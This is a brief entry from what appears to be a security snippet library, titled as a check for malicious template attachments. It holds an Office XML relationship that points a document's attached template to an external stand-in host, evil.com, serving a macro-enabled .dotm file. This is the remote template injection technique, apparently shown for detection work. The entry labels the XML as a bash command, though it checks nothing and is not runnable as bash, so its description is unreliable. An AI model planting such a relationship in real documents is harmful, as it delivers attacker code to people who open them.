---
id: e90312fa-cd7a-4419-9947-ed80bee5f31e
name: Check for malicious template attachment
type: command
executor: bash
data: '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship
  Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"

  Target="https://evil.com/malicious.dotm" TargetMode="External"/></Relationships>'
output: null
created_at: '2023-04-06T03:56:23.897489+00:00'
updated_at: '2023-04-10T20:36:52.682900+00:00'
---

# Check for malicious template attachment

```bash
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
Target="https://evil.com/malicious.dotm" TargetMode="External"/></Relationships>
```
